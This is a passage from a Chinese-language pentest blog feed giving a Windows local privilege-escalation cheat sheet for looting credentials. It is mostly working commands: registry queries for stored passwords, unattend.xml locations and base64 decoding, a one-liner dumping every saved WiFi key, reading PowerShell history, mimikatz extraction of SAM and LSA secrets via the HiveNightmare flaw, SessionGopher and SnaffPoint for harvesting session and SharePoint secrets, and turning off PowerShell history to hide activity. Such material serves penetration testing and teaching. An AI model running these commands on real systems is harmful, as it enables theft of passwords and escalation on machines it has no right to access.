</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">password</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
</span></code></pre></div></div>

<h3 id="在-unattendxml-中搜索密码">在 unattend.xml 中搜索密码</h3>
<p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p>

<p>Location of the unattend.xml files.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\Panther\Unattend.xml</span><span class="w">
</span><span class="n">C:\Windows\Panther\Unattend\Unattend.xml</span><span class="w">
</span><span class="nx">C:\Windows\system32\sysprep.inf</span><span class="w">
</span><span class="n">C:\Windows\system32\sysprep\sysprep.xml</span><span class="w">
</span></code></pre></div></div>

<p>Display the content of these files with <code class="language-plaintext highlighter-rouge">dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul</code>.</p>

<p>Example content</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&lt;</span><span class="n">component</span><span class="w"> </span><span class="nx">name</span><span class="o">=</span><span class="s2">"Microsoft-Windows-Shell-Setup"</span><span class="w"> </span><span class="n">publicKeyToken</span><span class="o">=</span><span class="s2">"31bf3856ad364e35"</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s2">"neutral"</span><span class="w"> </span><span class="n">versionScope</span><span class="o">=</span><span class="s2">"nonSxS"</span><span class="w"> </span><span class="n">processorArchitecture</span><span class="o">=</span><span class="s2">"amd64"</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">AutoLogon</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Password</span><span class="err">&gt;</span><span class="nx">U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo</span><span class="o">==</span><span class="err">&lt;</span><span class="n">/Password</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Enabled</span><span class="err">&gt;</span><span class="nx">true</span><span class="err">&lt;</span><span class="nx">/Enabled</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">Username</span><span class="err">&gt;</span><span class="nx">Administrateur</span><span class="err">&lt;</span><span class="nx">/Username</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">/AutoLogon</span><span class="err">&gt;</span><span class="w">

    </span><span class="err">&lt;</span><span class="n">UserAccounts</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">LocalAccounts</span><span class="err">&gt;</span><span class="w">
      </span><span class="err">&lt;</span><span class="n">LocalAccount</span><span class="w"> </span><span class="nx">wcm:action</span><span class="o">=</span><span class="s2">"add"</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Password</span><span class="err">&gt;</span><span class="o">*</span><span class="nx">SENSITIVE</span><span class="o">*</span><span class="nx">DATA</span><span class="o">*</span><span class="nx">DELETED</span><span class="o">*</span><span class="err">&lt;</span><span class="nx">/Password</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Group</span><span class="err">&gt;</span><span class="nx">administrators</span><span class="p">;</span><span class="n">users</span><span class="err">&lt;</span><span class="nx">/Group</span><span class="err">&gt;</span><span class="w">
       </span><span class="err">&lt;</span><span class="n">Name</span><span class="err">&gt;</span><span class="nx">Administrateur</span><span class="err">&lt;</span><span class="nx">/Name</span><span class="err">&gt;</span><span class="w">
      </span><span class="err">&lt;</span><span class="n">/LocalAccount</span><span class="err">&gt;</span><span class="w">
     </span><span class="err">&lt;</span><span class="n">/LocalAccounts</span><span class="err">&gt;</span><span class="w">
    </span><span class="err">&lt;</span><span class="n">/UserAccounts</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<p>Unattend credentials are stored in base64 and can be decoded manually with base64.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s2">"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">base64</span><span class="w"> </span><span class="nt">-d</span><span class="w"> 
</span><span class="n">SecretSecurePassword1234</span><span class="o">*</span><span class="w">
</span></code></pre></div></div>

<p>The Metasploit module <code class="language-plaintext highlighter-rouge">post/windows/gather/enum_unattend</code> looks for these files.</p>

<ul>
  <li><a href="https://www.cnblogs.com/zpchcbd/p/12232683.html">Unattended Installs提权 - zpchcbd - 博客园</a></li>
</ul>

<h3 id="iis-web-config-中的密码">IIS Web config 中的密码</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Childitem</span><span class="w"> </span><span class="err">–</span><span class="nx">Path</span><span class="w"> </span><span class="nx">C:\inetpub\</span><span class="w"> </span><span class="nt">-Include</span><span class="w"> </span><span class="nx">web.config</span><span class="w"> </span><span class="nt">-File</span><span class="w"> </span><span class="nt">-Recurse</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span></code></pre></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config</span><span class="w">
</span><span class="nx">C:\inetpub\wwwroot\web.config</span><span class="w">
</span></code></pre></div></div>

<h3 id="其他可能存在凭证的文件">其他可能存在凭证的文件</h3>

<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">%SYSTEMDRIVE%</span>\pagefile.sys
<span class="nv">%WINDIR%</span>\debug\NetSetup.log
<span class="nv">%WINDIR%</span>\repair\sam
<span class="nv">%WINDIR%</span>\repair\system
<span class="nv">%WINDIR%</span>\repair\software<span class="o">,</span> <span class="nv">%WINDIR%</span>\repair\security
<span class="nv">%WINDIR%</span>\iis6.log
<span class="nv">%WINDIR%</span>\system32\config\AppEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\SecEvent.Evt
<span class="nv">%WINDIR%</span>\system32\config\default.sav
<span class="nv">%WINDIR%</span>\system32\config\security.sav
<span class="nv">%WINDIR%</span>\system32\config\software.sav
<span class="nv">%WINDIR%</span>\system32\config\system.sav
<span class="nv">%WINDIR%</span>\system32\CCM\logs\<span class="o">*</span>.log
<span class="nv">%USERPROFILE%</span>\ntuser.dat
<span class="nv">%USERPROFILE%</span>\LocalS<span class="o">~</span><span class="m">1</span>\Tempor<span class="o">~</span><span class="m">1</span>\Content.IE5\index.dat
<span class="nv">%WINDIR%</span>\System32\drivers\etc\hosts
<span class="kd">C</span>:\ProgramData\Configs\<span class="o">*</span>
<span class="kd">C</span>:\Program <span class="kd">Files</span>\Windows <span class="kd">PowerShell</span>\<span class="o">*</span>
<span class="nb">dir</span> <span class="kd">c</span>:<span class="o">*</span><span class="kd">vnc</span>.ini <span class="na">/s /b
</span><span class="nb">dir</span> <span class="kd">c</span>:<span class="o">*</span><span class="kd">ultravnc</span>.ini <span class="na">/s /b
</span></code></pre></div></div>

<h3 id="wifi-密码">Wifi 密码</h3>

<p>Find AP SSID</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profile</span>
</code></pre></div></div>

<p>Get Cleartext Pass</p>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profile</span> <span class="o">&lt;</span><span class="kd">SSID</span><span class="o">&gt;</span> <span class="kd">key</span><span class="o">=</span><span class="kd">clear</span>
</code></pre></div></div>

<p>Oneliner method to extract wifi passwords from all the access point.</p>

<div class="language-batch highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cls</span> <span class="o">&amp;</span> <span class="nb">echo</span>. <span class="o">&amp;</span> <span class="k">for</span> <span class="na">/f </span><span class="s2">"tokens=4 delims=: "</span> <span class="vm">%a</span> <span class="k">in</span> <span class="o">(</span><span class="s1">'netsh wlan show profiles </span><span class="se">^|</span><span class="s1"> find "Profile "'</span><span class="o">)</span> <span class="k">do</span> @echo <span class="na">off</span> <span class="o">&gt;</span> <span class="kr">nul</span> <span class="o">&amp;</span> <span class="o">(</span><span class="nb">netsh</span> <span class="kd">wlan</span> <span class="kd">show</span> <span class="kd">profiles</span> <span class="kd">name</span><span class="o">=</span><span class="vm">%a</span> <span class="kd">key</span><span class="o">=</span><span class="kd">clear</span> <span class="o">|</span> <span class="nb">findstr</span> <span class="s2">"SSID Cipher Content"</span> <span class="o">|</span> <span class="nb">find</span> <span class="na">/v </span><span class="s2">"Number"</span> <span class="o">&amp;</span> <span class="nb">echo</span>.<span class="o">)</span> <span class="o">&amp;</span> @echo <span class="na">on</span>
</code></pre></div></div>
<p>注意，该一句话仅对英文系统有用，中文系统需要修改匹配字段。</p>

<h3 id="便笺中存放的密码">便笺中存放的密码</h3>
<p>The sticky notes app stores it’s content in a sqlite db located at C:\Users&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</p>

<h3 id="服务中存放的密码">服务中存放的密码</h3>
<p>Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path<span class="se">\t</span>o<span class="se">\S</span>essionGopher.ps1<span class="p">;</span>
Invoke-SessionGopher <span class="nt">-AllDomain</span> <span class="nt">-o</span>
Invoke-SessionGopher <span class="nt">-AllDomain</span> <span class="nt">-u</span> domain.com<span class="se">\a</span>dm-arvanaghi <span class="nt">-p</span> s3cr3tP@ss
</code></pre></div></div>
<h3 id="key-manager-中存放的密码">Key Manager 中存放的密码</h3>
<p>This software will display its output in a GUI</p>

<p>下面的命令将打开 windows 凭据管理器。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rundll32 keymgr,KRShowKeyMgr
</code></pre></div></div>
<h3 id="powershell-历史记录中存放的密码">Powershell 历史记录中存放的密码</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type</span> %userprofile%<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>wissky<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadline<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">type</span> <span class="nv">$env</span>:APPDATA<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\P</span>SReadLine<span class="se">\C</span>onsoleHost_history.txt
<span class="nb">cat</span> <span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath
<span class="nb">cat</span> <span class="o">(</span>Get-PSReadlineOption<span class="o">)</span>.HistorySavePath | sls passw
</code></pre></div></div>

<p>关闭 ps 历史记录</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-PSReadlineOption <span class="nt">-HistorySaveStyle</span> SaveNothing
</code></pre></div></div>

<h3 id="powershell-transcript-文件">Powershell Transcript 文件</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\&lt;</span>USERNAME&gt;<span class="se">\D</span>ocuments<span class="se">\P</span>owerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt
C:<span class="se">\T</span>ranscripts<span class="se">\&lt;</span>DATE&gt;<span class="se">\P</span>owerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt
</code></pre></div></div>

<h3 id="备用数据流ads中的密码">备用数据流（ADS）中的密码</h3>
<p>ADS 是添加到新技术文件系统（也称为 NT 文件系统 (NTFS)）中的功能，以提高与 Macintosh 分层文件系统 (HFS) 的可比性。</p>

<p>例如在 notepad 中编辑但未保存到文件的数据。</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Item</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Content</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">flag.txt</span><span class="w"> </span><span class="nt">-Stream</span><span class="w"> </span><span class="nx">Flag</span><span class="w">
</span></code></pre></div></div>

<h3 id="laps-settings">LAPS Settings</h3>
<p>Extract <code class="language-plaintext highlighter-rouge">HKLM\Software\Policies\Microsoft Services\AdmPwd</code> from Windows Registry.</p>

<ul>
  <li>LAPS Enabled: AdmPwdEnabled</li>
  <li>LAPS Admin Account Name: AdminAccountName</li>
  <li>LAPS Password Complexity: PasswordComplexity</li>
  <li>LAPS Password Length: PasswordLength</li>
  <li>LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled</li>
</ul>

<h1 id="参考资料">参考资料</h1>
<ul>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords">PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings</a></li>
  <li><a href="https://www.freebuf.com/articles/web/281863.html">手把手教你Windows提权 - FreeBuf网络安全行业门户</a></li>
  <li><a href="https://github.com/alphaSeclab/windows-security/blob/master/Readme_full.md#f39e40e340f61ae168b67424baac5cc6">windows-security/Readme_full.md at master · alphaSeclab/windows-security</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="Pentest" /><category term="windows" /><category term="LPE" /><category term="Info gathering" /><summary type="html"><![CDATA[Windows 本地提权 利用导出或查找密码提权 主要思路在于使用 mimikatz 或者从配置文件、注册表项中排查密码。 SAM and SYSTEM files(win10 及以下) 安全帐户管理器 (SAM)，通常是安全帐户管理器，是一个数据库文件。 用户密码以哈希格式存储在注册表配置单元中，作为 LM 哈希或 NTLM 哈希。 该文件位于 %SystemRoot%/system32/config/SAM 中，并安装在 HKLM/SAM 上。 # Usually %SYSTEMROOT% = C:\Windows %SYSTEMROOT%\repair\SAM %SYSTEMROOT%\System32\config\RegBack\SAM %SYSTEMROOT%\System32\config\SAM %SYSTEMROOT%\repair\system %SYSTEMROOT%\System32\config\SYSTEM %SYSTEMROOT%\System32\config\RegBack\system 直接使用 mimikatz 提取即可，无需使用 pwddump HiveNightmare(Windows 10 and 11) 不影响 Server。 CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user 使用 icacls 命令检查漏洞是否存在 C:\Windows\System32&gt; icacls config\SAM config\SAM BUILTIN\Administrators:(I)(F) NT AUTHORITY\SYSTEM:(I)(F) BUILTIN\Users:(I)(RX) &lt;-- this is wrong - regular users should not have read access! Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it. mimikatz&gt; token::whoami /full # List shadow copies available mimikatz&gt; misc::shadowcopies # Extract account from SAM databases mimikatz&gt; lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM # Extract secrets from SECURITY mimikatz&gt; lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY 【漏洞复现】CVE-2021-36934 Windows 提权漏洞复现 - TeamsSix 搜索文件内容中的 password 在 .xml, .ini, .txt .config 等文件中搜索 Password cd C:\ &amp; findstr /SI /M "password" *.xml *.ini *.txt findstr /si password *.xml *.ini *.txt *.config 2&gt;nul &gt;&gt; results.txt findstr /spin "password" *.* 在远程地址例如 SMB Shares 或 SharePoint 搜索 Search passwords in SharePoint: nheiniger/SnaffPoint (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6) # First, retrieve a token ## Method 1: using SnaffPoint binary $token = (.\GetBearerToken.exe https://your.sharepoint.com) ## Method 2: using AADInternals Install-Module AADInternals -Scope CurrentUser Import-Module AADInternals $token = (Get-AADIntAccessToken -ClientId "9bc3ab49-b65d-410a-85ad-de819febfddc" -Tenant "your.onmicrosoft.com" -Resource "https://your.sharepoint.com") # Second, search on Sharepoint ## Method 1: using search strings in ./presets dir .\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token ## Method 2: using search string in command line ### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference .\SnaffPoint.exe -u "https://your.sharepoint.com" -t $token -l -q "filename:.config" Search passwords in SMB Shares: SnaffCon/Snaffler 搜索和 password 相关的文件名 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* where /R C:\ user.txt where /R C:\ *.ini 搜索和 password 相关的注册表 REG QUERY HKLM /F "password" /t REG_SZ /S /K REG QUERY HKCU /F "password" /t REG_SZ /S /K reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2&gt;nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s 在 unattend.xml 中搜索密码 自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。 Location of the unattend.xml files. C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend\Unattend.xml C:\Windows\system32\sysprep.inf C:\Windows\system32\sysprep\sysprep.xml Display the content of these files with dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2&gt;nul. Example content &lt;component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64"&gt; &lt;AutoLogon&gt; &lt;Password&gt;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==&lt;/Password&gt; &lt;Enabled&gt;true&lt;/Enabled&gt; &lt;Username&gt;Administrateur&lt;/Username&gt; &lt;/AutoLogon&gt; &lt;UserAccounts&gt; &lt;LocalAccounts&gt; &lt;LocalAccount wcm:action="add"&gt; &lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt; &lt;Group&gt;administrators;users&lt;/Group&gt; &lt;Name&gt;Administrateur&lt;/Name&gt; &lt;/LocalAccount&gt; &lt;/LocalAccounts&gt; &lt;/UserAccounts&gt; Unattend credentials are stored in base64 and can be decoded manually with base64. $ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=" | base64 -d SecretSecurePassword1234* The Metasploit module post/windows/gather/enum_unattend looks for these files. Unattended Installs提权 - zpchcbd - 博客园 IIS Web config 中的密码 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config C:\inetpub\wwwroot\web.config 其他可能存在凭证的文件 %SYSTEMDRIVE%\pagefile.sys %WINDIR%\debug\NetSetup.log %WINDIR%\repair\sam %WINDIR%\repair\system %WINDIR%\repair\software, %WINDIR%\repair\security %WINDIR%\iis6.log %WINDIR%\system32\config\AppEvent.Evt %WINDIR%\system32\config\SecEvent.Evt %WINDIR%\system32\config\default.sav %WINDIR%\system32\config\security.sav %WINDIR%\system32\config\software.sav %WINDIR%\system32\config\system.sav %WINDIR%\system32\CCM\logs\*.log %USERPROFILE%\ntuser.dat %USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat %WINDIR%\System32\drivers\etc\hosts C:\ProgramData\Configs\* C:\Program Files\Windows PowerShell\* dir c:*vnc.ini /s /b dir c:*ultravnc.ini /s /b Wifi 密码 Find AP SSID netsh wlan show profile Get Cleartext Pass netsh wlan show profile &lt;SSID&gt; key=clear Oneliner method to extract wifi passwords from all the access point. cls &amp; echo. &amp; for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" &amp; echo.) &amp; @echo on 注意，该一句话仅对英文系统有用，中文系统需要修改匹配字段。 便笺中存放的密码 The sticky notes app stores it’s content in a sqlite db located at C:\Users&lt;user&gt;\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite 服务中存放的密码 Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1 Import-Module path\to\SessionGopher.ps1; Invoke-SessionGopher -AllDomain -o Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss Key Manager 中存放的密码 This software will display its output in a GUI 下面的命令将打开 windows 凭据管理器。 rundll32 keymgr,KRShowKeyMgr Powershell 历史记录中存放的密码 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt cat (Get-PSReadlineOption).HistorySavePath cat (Get-PSReadlineOption).HistorySavePath | sls passw 关闭 ps 历史记录 Set-PSReadlineOption -HistorySaveStyle SaveNothing Powershell Transcript 文件 C:\Users\&lt;USERNAME&gt;\Documents\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt C:\Transcripts\&lt;DATE&gt;\PowerShell_transcript.&lt;HOSTNAME&gt;.&lt;RANDOM&gt;.&lt;TIMESTAMP&gt;.txt 备用数据流（ADS）中的密码 ADS 是添加到新技术文件系统（也称为 NT 文件系统 (NTFS)）中的功能，以提高与 Macintosh 分层文件系统 (HFS) 的可比性。 例如在 notepad 中编辑但未保存到文件的数据。 PS &gt; Get-Item -path flag.txt -Stream * PS &gt; Get-Content -path flag.txt -Stream Flag LAPS Settings Extract HKLM\Software\Policies\Microsoft Services\AdmPwd from Windows Registry. LAPS Enabled: AdmPwdEnabled LAPS Admin Account Name: AdminAccountName LAPS Password Complexity: PasswordComplexity LAPS Password Length: PasswordLength LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled 参考资料 PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings 手把手教你Windows提权 - FreeBuf网络安全行业门户 windows-security/Readme_full.md at master · alphaSeclab/windows-security]]></summary></entry><entry><title type="html">Windows 提权知识点</title><link href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9.html" rel="alternate" type="text/html" title="Windows 提权知识点" /><published>2023-11-20T13:34:21+08:00</published><updated>2023-11-20T13:34:21+08:00</updated><id>/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9</id><content type="html" xml:base="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9.html"><![CDATA[<h1 id="windows-本地提权">Windows 本地提权</h1>
<h2 id="利用导出或查找密码提权">利用导出或查找密码提权</h2>
<p>主要思路在于使用 mimikatz 或者从配置文件、注册表项中排查密码。</p>

<h3 id="sam-and-system-fileswin10-及以下">SAM and SYSTEM files(win10 及以下)</h3>
<p>安全帐户管理器 (SAM)，通常是安全帐户管理器，是一个数据库文件。<br />
用户密码以哈希格式存储在注册表配置单元中，作为 LM 哈希或 NTLM 哈希。<br />
该文件位于 %SystemRoot%/system32/config/SAM 中，并安装在 HKLM/SAM 上。</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Usually %SYSTEMROOT% = C:\Windows</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\system</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SYSTEM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\system</span><span class="w">
</span></code></pre></div></div>

<p><strong>直接使用 mimikatz 提取即可，无需使用 pwddump</strong></p>

<h3 id="hivenightmarewindows-10-and-11">HiveNightmare(Windows 10 and 11)</h3>
<p>不影响 Server。</p>

<blockquote>
  <p>CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user</p>
</blockquote>

<p>使用 <code class="language-plaintext highlighter-rouge">icacls</code> 命令检查漏洞是否存在</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\System32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">icacls</span><span class="w"> </span><span class="nx">config\SAM</span><span class="w">
</span><span class="n">config\SAM</span><span class="w"> </span><span class="nx">BUILTIN\Administrators:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
           </span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\SYSTEM:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
           </span><span class="n">BUILTIN\Users:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span><span class="w">    </span><span class="err">&lt;</span><span class="o">--</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">wrong</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">regular</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="nx">should</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">read</span><span class="w"> </span><span class="nx">access</span><span class="o">!</span><span class="w">
</span></code></pre></div></div>

<p>Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">token::whoami</span><span class="w"> </span><span class="nx">/full</span><span class="w">

</span><span class="c"># List shadow copies available</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">misc::shadowcopies</span><span class="w">

</span><span class="c"># Extract account from SAM databases</span><span class="w">
